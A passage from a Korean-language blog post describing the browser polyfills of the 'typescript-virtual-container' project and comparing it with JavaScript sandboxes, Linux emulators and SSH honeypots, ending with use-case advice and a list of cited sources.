    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Wasm 없음. 외부 폴리필 라이브러리 없음. `webpack-node-externals` 넌센스 없음. 그냥 별칭된 모듈과 몇 가지 주입된 전역 변수야. 각각을 살펴보자. 일부는 진짜 인상적이야.

**`node:fs` -- 가짜 파일시스템으로서의 IndexedDB**

이게 내가 가장 좋아하는 거야. `node:fs` 폴리필은 동기 Node.js fs API(`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...)를 구현하는데, 두 레이어로 뒷받침돼: 동기 읽기를 위한 메모리 내 `Map`, 페이지 로드 간 영속성을 위한 IndexedDB. 쓰기는 즉시 Map에 기록되고(`writeFileSync` 직후 `readFileSync`가 항상 작동하도록), 그 다음 비동기적으로 백그라운드에서 IndexedDB로 플러시돼.

```js
// 동기 캐시 (경로 → Uint8Array | null) -- 즉시 읽기
const memCache = new Map();

// 시작 시 IndexedDB의 모든 것을 memCache로 미리 로드
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

이게 브라우저에서 페이지 로드 간 VFS 스냅샷이 살아남는 이유야 -- 전체 `.vfsb` 바이너리가 이 폴리필을 통해 IndexedDB에 기록되고, 다음 로드 시 다시 읽혀. Wasm 없음. 서버 없음. 그냥 IndexedDB, 2011년부터 모든 브라우저에 있었어.

**`node:crypto` -- 순수 JS의 SHA-256**

Wasm 암호화 라이브러리를 가져오는 대신, crypto 폴리필은 FIPS 180-4 라운드 상수를 사용하여 SHA-256을 처음부터 구현해. 완전한 hex/base64/Uint8Array 출력 지원이 있는 166줄의 순수 JS. 라이브러리의 모든 해싱이 이를 통해 간다 -- SSH 호스트 키 지문, 내부 체크섬, 모든 것. 컴팩트하고, 제로 의존성, 그냥 작동해.

**`node:os` -- 브라우저의 실제 하드웨어 읽기**

이건 좋은 터치야. 하드코딩된 플레이스홀더 값 대신, `node:os`는 총 RAM에 `navigator.deviceMemory`를, CPU 수에 `navigator.hardwareConcurrency`를 읽어. 그래서 브라우저 빌드 내부의 `neofetch`가 실제 머신에 해당하는 것을 보고해 -- 만들어진 `2코어, 2GB RAM` 스텁이 아니야.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB 폴백
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // navigator.userAgent도 파싱해서 CPU 모델 문자열을 추측
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` -- 정직한 스텁**

브라우저는 TCP 소켓을 열거나 실제 SSH를 실행할 수 없어서, 이들은 명확한 메시지와 함께 `NotImplemented` 오류를 던지는 스텁이야. 조용한 실패 없음, 객체가 예상되는 곳에 `undefined` 반환 없음. 그냥 시끄럽고 명확한 "이건 브라우저에서 작동하지 않아" -- 정확히 원하는 거야.

**`process.js`와 `buffer.js` -- 주입된 전역 변수**

이 둘은 esbuild의 `inject` 옵션을 통해 모든 번들 파일의 상단에 주입돼. 그래서 `process`와 `Buffer`가 명시적인 import 없이 전역적으로 사용 가능해. `process.js`는 작아: `env`, `version`, `platform: 'browser'`, `queueMicrotask`를 통한 `nextTick`, `performance.now()`를 통한 `uptime`. `buffer.js`는 `Uint8Array` 위의 완전한 `Buffer` 재구현이야 -- SSH 구현과 VFS가 의존하는 모든 `readUInt32BE`, `writeInt16LE`, hex/base64 인코딩 메서드.

---

전체 폴리필 세트는 약 640줄의 손으로 작성된 JS야. npm 패키지 없음. Wasm 없음. 그리고 결과는 라이브러리 그 자체인 브라우저 번들이야. 네이티브로 실행되며, Node 우선 라이브러리에서 흔히 있는 "근데 브라우저에서 실제로 작동해?" 불안이 전혀 없어. 궁금하다면 저장소의 `polyfills/` 폴더를 확인해 봐 -- 각 파일이 잘 포함되어 있고 그 자체로 읽을 수 있어. 내가 많이 감사하는 스타일 선택이야.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **카테고리** | JS 샌드박스 | JS 샌드박스 | JS 샌드박스 | 에뮬레이터 | 에뮬레이터 | Node.js/Wasm | 허니팟 | 시뮬레이터 |
| **JS 격리** | ⚠️ 스코프 | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | 부분적 | n/a | ✅ Worker |
| **실제 Linux 커널** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **셸 인터프리터** | ❌ | ❌ | ❌ | ✅ (실제) | ✅ (실제) | ✅ (실제) | 부분적 | ✅ (커스텀) |
| **~170개 Unix 명령** | ❌ | ❌ | ❌ | ✅ | ✅ | 부분적 | ~20 | ✅ |
| **POSIX 권한** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | 부분적 | ✅ 적용됨 |
| **사용자 관리** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | 최소 | ✅ 완전 |
| **실제 SSH 서버** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **허니팟/감사** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **VFS diff/스냅샷** | ❌ | ❌ | ❌ | 제한적 | ❌ | ❌ | ❌ | ✅ |
| **가상 네트워크 L2/L3** | ❌ | ❌ | ❌ | 기본 | ❌ | ❌ | ❌ | ✅ 완전 |
| **가상 VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **브라우저 지원** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js 네이티브** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **타입 있는 API** | 기본 | ✅ | ✅ | 최소 | ❌ | ✅ | ❌ | ✅ 완전 |
| **바이너리 호환성** | n/a | n/a | n/a | ✅ | ✅ | 부분적 | n/a | ❌ |
| **부팅 시간** | 즉시 | 즉시 | 즉시 | 15–40초 | 15–40초 | 2–5초 | 즉시 | <1초 |
| **RAM/인스턴스** | ~1 MB | ~3–10 MB | ~5–15 MB | 150–256 MB | 200+ MB | ~100 MB | ~50 MB | ~5–20 MB |
| **런타임 의존성** | 0 | 1 (네이티브) | 1 (Wasm) | 0 | 독점 | 1 | Python 의존성 | 3 (ssh2, ws, fflate) |
| **상태** | 안정 | ✅ 활동적 | ✅ 활동적 | ✅ 매우 활동적 | 상용 | ✅ 활동적 | ✅ 활동적 | ✅ 활동적 |

---

## 언제 무엇을 써야 할까

**신뢰할 수 없는 JavaScript를 실행해야 함 -- 사용자가 제출한 공식, 플러그인, 스크립트 훅.**
→ `isolated-vm`. 실제 V8 Isolate, 하드 메모리 제한, 명시적 통신 브리지. `vm2`는 피해 -- CVE 목록이 계속 늘어나고 있어, 진짜 몇 달마다 새로운 거야. `vm`도 피해 -- 전혀 샌드박스가 아니야, 제발.

**JS를 샌드박스해야 하는데 네이티브 애드온을 원하지 않거나 브라우저 호환성이 필요함.**
→ `quickjs-emscripten`. Wasm 경계, ~500 KB 모듈, 브라우저와 Node에서 작동. V8보다 느리지만 진정으로 격리됨.

**바이너리 호환성으로 실제 수정되지 않은 Linux OS를 부팅해야 함.**
→ 32비트 Linux는 `v86`, 기존 Docker 이미지가 있으면 `container2wasm`. 150 MB+ RAM과 30초 부팅을 받아들여야 해, 그게 조건이야. 64비트가 필요하면 CheerpX를 보거나 그냥 실제 컨테이너 런타임을 사용해.

**백엔드 없이 웹 앱에 Linux 같은 터미널을 내장해야 함.**
→ `v86` (전체 OS, 무거움, 시작 느림) 또는 `typescript-virtual-container`의 브라우저 번들 (시뮬레이터, 더 가벼움, 즉시 부팅, 완전한 데스크톱을 위한 `startxfce4` 포함 -- 인정하건대 꽤 멋져).

**대화형 온라인 코딩 튜토리얼이나 브라우저 IDE가 필요함.**
→ Node.js 생태계 중심이면 WebContainers. 실제 Linux 사용자 공간이 필요하면 CheerpX. 더 가벼운 옵션과 타입 있는 API를 원하면 `typescript-virtual-container`의 브라우저 번들.

**SSH 공격자 TTP를 대규모로 수집하고 싶음.**
→ Cowrie가 프로덕션 표준이야, 끝. 모든 Linux 서버에서 실행되고, 모든 SIEM과 통합되며, 지금은 LLM 모드도 있어. 그냥 Cowrie를 써.

**Node.js 애플리케이션에서 프로그래밍 API와 함께 SSH 허니팟 데이터를 원함.**
→ `typescript-virtual-container`. 명령이 실제로 실행돼. VFS는 스냅샷과 diff를 할 수 있는 실제 데이터 구조야. 공격자는 설득력 있는 대화형 환경을 얻고, Node를 떠나지 않고 구조화된 감사 데이터를 얻어.

**Docker 없이 CI에서 셸 자동화/테스트가 필요함.**
→ `typescript-virtual-container`. 1초 안에 부팅, 테스트 전에 스냅샷, 후에 복원. 타입 있는 API로 셸 명령 실행. Docker 데몬, 커널, VM, 대기 시간 없음.

**다중 테넌트 셸 환경이 필요함 (SaaS, 교육, 훈련).**
→ `typescript-virtual-container`. 인스턴스당 5–20 MB vs. 에뮬레이터의 150–256 MB. 100명의 동시 사용자: ~2 GB vs. ~25 GB. 호스팅 비용에 큰 차이야!

**다중 VM 네트워크 연구실도 구축할 수 있는 현실적인 허니팟이 필요함.**
→ `typescript-virtual-container`는 이 공간에서 둘 다 하는 유일한 것이야.

---

## 할 수 없는 것 (그리고 솔직하게 말하고 싶어)

네이티브 x86 바이너리를 실행할 수 없어. C 코드를 컴파일하거나, 실제 Python 인터프리터를 실행하거나, Linux용으로 컴파일된 소프트웨어를 사용해야 한다면, 그 시스템 콜을 뒷받침할 커널 ABI가 없어. `gcc`, `python3`, `node` 같은 명령은 스텁이야 -- `--version`과 일반적인 호출에 응답하지만, 실제로 아무것도 실행하지 않아.

이게 근본적인 트레이드오프야: 10–50배 낮은 메모리, 즉시 부팅, 브라우저 호환성, 타입 있는 API, 실제 SSH, 가상 네트워킹을 얻는 대신 Linux 사용자 공간과의 바이너리 호환성을 포기해.

Fortune은 프로젝트를 설계할 때 이것에 대해 많이 생각했어. 그녀가 대상으로 한 사용 사례 -- 허니팟, 테스트, 내장 터미널, CI 환경 -- 에서는 컴파일된 바이너리를 실행할 필요가 전혀 없어. 셸 파이프라인, 파일 조작, 네트워크 라우팅, SSH로 모든 걸 커버해. 하지만 사용 사례에 실제 컴파일된 소프트웨어가 필요하다면, `v86`이나 Docker가 올바른 답이지, 이건 아니야.

---

## 마무리

그래, 그래. 이 생태계는 겉에서 보이는 것보다 더 넓고 더 파편화되어 있어. `vm`은 스코프 분리자이지 샌드박스가 아니야. `vm2`는 계속 CVE를 축적하고 있어 (진짜, 이번 달 권고 사항만 확인해 봐). `isolated-vm`은 올바른 JS 샌드박싱 답변이지만 JS 전용이야. `quickjs-emscripten`은 브라우저 호환이 필요하거나 네이티브 애드온을 피하려고 할 때 올바른 선택이야. `v86`과 CheerpX는 실제 바이너리 호환성이 필요할 때 진짜 에뮬레이터야. WebContainers는 Wasm의 Node.js이지 일반적인 Linux 환경이 아니야. Cowrie는 SSH 허니팟의 황금 표준이지만 Python이고 Node 네이티브가 아니야.

그리고 `typescript-virtual-container` -- Fortune의 프로젝트 -- 가 그 사이에 있어. 에뮬레이터도, JS 샌드박스도, 수동적 허니팟도 아니야. 그 모든 것 사이에 있는 무언가로, 다른 것들이 할 수 없는 많은 일에 놀라울 정도로 유용하다는 게 드러났어.

`typescript-virtual-container`는 다른 어떤 것도 건드리지 않는 간극을 채워: 완전하고, 프로그래밍 가능한 Linux 셸 환경으로, 실제 SSH, SFTP, POSIX 권한, 사용자 관리, 가상 네트워킹, 타입 있는 TypeScript API를 가지고 -- ~10 MB에서 실행되고, 1초 안에 부팅되며, Node.js와 브라우저 모두에서 작동해.

직접 써보고 싶다면: 소스는 [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)에 있고, 라이브 데모 (완전한 데스크톱을 위한 `startxfce4` 포함, 진짜 sick이야)는 [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)에 있어. 확인해 보고 Fortune에게 GitHub에서 별 좀 줘, 그녀는 받을 자격이 있어!

읽어줘서 고마워 -- 내 기준에서도 정말 긴 글이었어 :) 도움이 됐길 바라!

---

## 출처

모든 주장을 출처 -- CVE 권고, 공식 문서, GitHub 저장소, 유지보수자의 블로그 글 -- 에 연결하려고 노력했어. 몇 가지 참고: vm2 CVE 목록은 계속 늘어나서 FortiGuard 링크는 네가 읽을 때쯤이면 오래됐을 수 있어 (최신 정보는 GitHub advisories 페이지를 확인해). Bellard 링크는 모두 안정적이야 -- 그의 개인 사이트는 계속 유지되고 콘텐츠는 변하지 않아. 그리고 폴리필에 대해 더 깊이 알고 싶다면, `typescript-virtual-container` 저장소의 `polyfills/` 폴더를 직접 살펴봐 -- 내가 여기에 쓸 수 있는 어떤 설명보다 더 읽기 쉬워.

### JavaScript 샌드박스

- **Node.js `vm` 모듈** -- 공식 문서: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Node.js `vm` 보안 경고** -- "vm 모듈은 보안 메커니즘이 아닙니다. 신뢰할 수 없는 코드를 실행하는 데 사용하지 마세요.": [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **vm2 CVE 타임라인** -- FortiGuard 전체 CVE 목록 및 날짜: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- 비동기 에러 스택 탈출, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + Function 탈출, PoC gist: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- 완전한 PoC가 있는 Exploit DB 항목: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **vm2 2026 CVE** -- 11개의 새로운 샌드박스 탈출, 분석: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"JS에서 JS를 샌드박싱하는 것이 어려운 이유"** -- oxeye.io CVE-2022-36067 사후 분석: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **V8 Isolate 내부** -- 임베딩 가이드: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **QuickJS 엔진** -- Fabrice Bellard: [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Deno 권한 모델** -- 문서: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Deno 2 릴리스** -- 2024년 10월: [deno.com/blog/v2](https://deno.com/blog/v2)
- **TC39 ShadowRealm 제안** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **TC39 Compartments 제안** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"JavaScript 코드 샌드박싱"** -- Andrew Healey의 Deno 샌드박스 접근 방식에 대한 실용적 글: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Linux 에뮬레이터

- **`v86`** -- npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · 데모: [copy.sh/v86](https://copy.sh/v86)
- **v86 OS 지원 매트릭스** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (v86이 사용하는 BIOS) -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Bochs VBE 확장** (VGA 참조) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Bellard의 에뮬레이터: [bellard.org/jslinux](https://bellard.org/jslinux/) · 기술 노트 (TinyEMU, 역사, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- C 소스: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · 비공식 GitHub 미러: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- OpenRISC JS 에뮬레이터: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · 데모: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- 문서: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreads 가이드: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API 문서: [webcontainers.io](https://webcontainers.io) · 발표: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ 개요: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT 블로그 글: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison 요약: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### 터미널 스택

- **xterm.js** -- npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · 사이트: [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### 허니팟

- **Cowrie** -- GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · 문서: [docs.cowrie.org](https://docs.cowrie.org) · 사이트: [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub (보관됨): [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- 최소 Node.js SSH 허니팟: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- 선별된 목록: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- 시스템 정보 발견 (공격자가 허니팟을 식별하는 방법): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **라이브 데모**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **아키텍처 가이드**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (SSH 프로토콜 구현) -- npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (VFS 스냅샷 압축) -- npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (WebSocket 셸 전송) -- npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### 배경 읽기 자료

- **POSIX 권한 모델** -- Open Group 스펙: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (VFS 영속성에 사용된 패턴) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **V8 Isolate 모델** -- "Embedder's Guide": [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **RISC-V ISA 스펙** (TinyEMU/JSLinux 컨텍스트용) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **OpenRISC 1000 아키텍처** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **"Deno를 통한 Pyodide 샌드박스에서 Python 코드 실행"** -- Simon Willison TIL, Wasm 접근 방식과의 유용한 대비: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"브라우저에서 자체 호스팅 QuickJS 실행"** -- Simon Willison TIL, quickjs-emscripten 번들 크기: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)